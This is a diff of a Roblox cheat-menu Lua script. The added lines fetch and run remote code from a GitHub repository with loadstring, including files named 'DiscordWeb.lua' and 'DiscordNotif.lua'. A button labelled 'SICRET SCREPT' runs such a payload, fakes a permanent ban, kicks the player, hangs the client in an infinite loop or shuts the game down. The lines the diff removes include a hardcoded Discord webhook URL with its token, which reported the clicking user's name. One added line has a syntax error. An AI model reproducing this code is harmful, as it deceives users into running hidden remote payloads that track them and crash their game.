@@ -1,5 +1,5 @@
 -- Services
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/UsedTheScript.lua"))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/DiscordWeb.lua"))()
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
@@ -8,6 +8,7 @@ local TeleportService = game:GetService("TeleportService")
 local ProximityPromptService = game:GetService("ProximityPromptService")
 
 -- Variables
+local GrowGame = 126884695634066
 local LocalPlayer = Players.LocalPlayer
 local jumpEnabled = false
 local noclipEnabled = false
@@ -606,6 +607,12 @@ UtilityTab:CreateButton({
     end,
 })
 
+if game.PlaceId = GrowGame then
+    local GrowTab = Window:CreateTab("Grow a Garden (W.I.P)", nil)
+    
+    
+end
+
 local Scripts = Window:CreateTab("Scripts", nil)
 
 Scripts:CreateButton({
@@ -759,34 +766,8 @@ GuiTab:CreateButton({
 GuiTab:CreateButton({
     Name = "⚠️SICRET SCREPT⚠️",
     Callback = function()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/DiscordNotif.lua"))()
         local function Lol(Secret)
-            function SendMessage(url, message)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    
-    if message:match("^%s*$") then
-        message = LocalPlayer.DisplayName .. " REST IN PEACE🕊️"
-    else
-        message = message .. "" .. LocalPlayer.DisplayName .. " REST IN PEACE🕊️"
-    end
-
-    local data = {
-        content = message
-    }
-    local body = http:JSONEncode(data)
-    request({
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-end
-
-local url = "https://discord.com/api/webhooks/1381267617611776060/gAC_QyTuDsMMj4hht6FhRM3b5SCAOYfaJ-h-a_Xml937Fqx3cdMoDqos2MMyBpB0XVf5"
-SendMessage(url, "💀BRO CLICKED IT RIP💀")
-
             if Secret == "YUH UH" then
                 for i = 5, 1, -1 do
                     StarterGui:SetCore("SendNotification", {
@@ -803,7 +784,7 @@ SendMessage(url, "💀BRO CLICKED IT RIP💀")
                     Duration = 3
                 })
                 task.wait(60)
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/kuro5222/Kuro/main/RipBro.lua.txt"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/kuro5222/Kuro/main/Crashed.lua"))()
                 task.wait(1)
                 game.Players.LocalPlayer:Kick("Perm ban (Reason: Hacking)")
 
@@ -811,8 +792,8 @@ SendMessage(url, "💀BRO CLICKED IT RIP💀")
                 while true do end
             elseif Secret == "NAH UH" then
                 task.wait(60)
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/kuro5222/Kuro/main/RipBro.lua.txt"))()
-                task.wait()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/kuro5222/Kuro/main/Crashed.lua"))()
+                task.wait(1)
                 game:Shutdown()
             end
         end
